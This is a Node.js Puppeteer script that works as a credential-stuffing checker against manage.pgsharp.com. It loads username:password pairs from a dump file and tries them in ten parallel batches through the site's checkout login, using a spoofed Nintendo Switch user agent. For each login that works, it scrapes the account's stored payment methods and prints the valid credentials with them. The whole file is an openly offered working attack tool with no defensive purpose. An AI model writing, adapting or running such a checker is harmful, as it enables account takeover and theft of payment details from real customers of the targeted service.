const puppeteer = require("puppeteer");
const lineReader = require('line-reader');
const path = require('path');

let dump = [];
let valids = [];
let combos = [];

lineReader.eachLine('main.txt', (line, last) => {
    if(line.split(" ").length == 1){
        if(line.split(":").length == 2){
            dump.push({username: line.split(":")[0], password: line.split(":")[1]});
        }
    }
    if(last){
        allocate();
        return false;
    }
});

function allocate(){
    let accountAllocation = [];
    let stacks = 10;
    let stackCount = 0;
    for(let t=0; t<stacks; t++){
        accountAllocation[t] = [];
    }
    for(let l=0; l<dump.length; l++){
        accountAllocation[stackCount].push(dump[l]);
        if(stackCount >= (stacks-1)) stackCount = 0; else stackCount++;
    }
    for(let v=0; v<stacks; v++){
        main(accountAllocation[v]);
    }
}

async function main(accounts){
    logStatus();
    for(let i=0; i<accounts.length; i++){
        let combo = await scrape(accounts[i].username, accounts[i].password);
        if(combo.error == "Slow Connection Error. Retry"){
            i--;
            continue;
        }
        if(combo.success){
            valids.push(combo);
        }
        combos.push(combo);
        logStatus();
    }
}

function logStatus(){
    console.clear();
    console.log("Valid: " + valids.length);
    console.log("Invalids: " + (combos.length - valids.length));
    for(let x=0; x<valids.length; x++){
        console.log(valids[x]);
    }
}

async function scrape(username, password){
    const browser = await puppeteer.launch();
    const page = await browser.newPage();
    await page.setUserAgent('Mozilla/5.0 (Nintendo Switch; WebApplet) AppleWebKit/606.4 (KHTML, like Gecko) NF/6.0.1.16.10 NintendoBrowser/5.1.0.20923');
    await page.goto('https://manage.pgsharp.com/cart.php?a=confproduct&i=0', {timeout: 0});
    await page.click('#product1-order-button');
    await page.waitForSelector('#btnCompleteProductConfig', {timeout: 0});
    await page.click('#btnCompleteProductConfig');
    await page.waitForTimeout(2000);
    await page.goto('https://manage.pgsharp.com/cart.php?a=view', {timeout: 0});
    await page.click('#checkout');
    await page.waitForSelector('#btnAlreadyRegistered', {timeout: 0});
    await page.waitForTimeout(5000);
    await page.click('#btnAlreadyRegistered', {delay: 500});
    await page.waitForTimeout(1000);
    await page.type('#inputLoginEmail', username);
    await page.type('#inputLoginPassword', password);
    await page.waitForSelector('#paymentGatewaysContainer div div', {timeout: 0});
    let option = await page.$$("#paymentGatewaysContainer div div");
    await option[8].click();
    await page.click('#btnCompleteOrder');
    await page.waitForSelector(".alert.alert-danger.checkout-error-feedback", {timeout: 0});
    let box = await page.$(".alert.alert-danger.checkout-error-feedback");
    let source = await page.evaluate(el => el.textContent, box);
    if(source.includes("Login Details Incorrect. Please try again.") || source.includes("Login Details Incorrect. Please try again.")){
        browser.close();
        return {username: username, password: password, success: false, error: "Login Details Invalid"};
    }
    if(source.includes("You did not enter your email address") || source.includes("You did not enter a password")){
        browser.close();
        return {username: username, password: password, success: false, error: "Slow Connection Error. Retry"};
    }
    await page.goto("https://manage.pgsharp.com/index.php?rp=/account/paymentmethods", {timeout: 0});
    await page.waitForSelector("p", {timeout: 0});
    let text = await page.$("p");
    let value = await page.evaluate(el => el.textContent, text);
    if(!value.includes("An overview of your payment methods and settings.")){
        browser.close();
        return {username: username, password: password, success: false, error: "Payment Method Unavailable"};
    }
    let data = await page.$$eval('#payMethodList tbody tr td', tds => tds.map((td) => {
        return td.innerText;
      }));
    let paymentList = splitArrayIntoChunksOfLen(data, 5);
    for(let j=0; j<paymentList.length; j++){
        paymentList[j] = paymentList[j][1];
    }
    browser.close();
    return {username: username, password: password, success: true, paymentMethods: paymentList};
}

function splitArrayIntoChunksOfLen(arr, len) {
    let chunks = [];
    let i = 0;
    let n = arr.length;
    while (i < n) {
      chunks.push(arr.slice(i, i += len));
    }
    return chunks;
  }